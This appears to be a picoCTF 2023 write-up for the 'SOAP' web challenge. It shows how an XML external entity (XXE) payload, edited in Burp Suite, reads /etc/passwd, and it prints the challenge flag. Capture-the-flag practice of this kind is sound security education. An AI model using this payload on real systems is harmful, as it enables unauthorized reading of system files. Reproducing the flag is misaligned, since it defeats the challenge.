# SOAP
## Overview
100 points

picoCTF 2023
## Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
### Hints
XML external entity Injection

## Solution
To access the flag, we need to modify the XXE payload to exploit the vunerability. We can do this through Burp Suite.
<br>
We can easily find the XML using the Intercept tab in Burp Proxy, and it currently looks like this:
```html
<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>
```
We will modify it to look like this:
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```
Forwarding the request makes the flag appear at the bottom of the website :D
<br><br>
<img width="1127" alt="image" src="https://github.com/xoxo-ily/ctfWriteups/assets/68173773/db0d6d0e-4001-4e2b-8885-4cd4956a1b90">

# picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
## Resources used
[portswigger xxe tutorial](https://portswigger.net/web-security/xxe)
